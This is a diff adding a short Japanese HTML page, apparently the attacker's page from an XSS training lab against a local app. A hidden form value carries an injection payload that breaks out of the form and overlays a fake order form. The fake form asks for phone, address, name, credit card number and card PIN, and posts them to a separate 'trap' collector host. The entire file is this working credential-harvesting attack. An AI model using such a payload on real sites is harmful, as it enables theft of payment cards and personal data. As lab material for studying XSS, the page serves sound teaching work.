@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>怪しいブログ</title>
+</head>
+<body style="background-color: black; color: white;">
+    <h1>怪しいブログ</h1>
+    <div>
+        最近、「なんでも屋」がクレジットカード対応したらしい 2018/08/16
+    </div>
+    <form action="http://localhost:8080/xss2" method="POST">
+        <input type="hidden" name="name" value='"></form><form style=top:90px;left:5px;position:absolute;z-index:99;background-color:white; action=http://trap:8080/trap/xss2GetCredit method=POST><input type=hidden name=bought value=true>品物<input type=text name=product><br>電話<input type=text name=tel><br>住所<input type=text name=addr><br>名前<input type=text name=name><br>クレジットカード<input type=text name=credit>暗証番号<input type=text name=creditPassword><span style="'>
+        <input style="cursor: pointer;text-decoration: underline;color: blue;border: none;background: transparent; font-size: 100%;" type="submit" value="なんでも屋リンク">
+    </form>
+</body>
+</html>
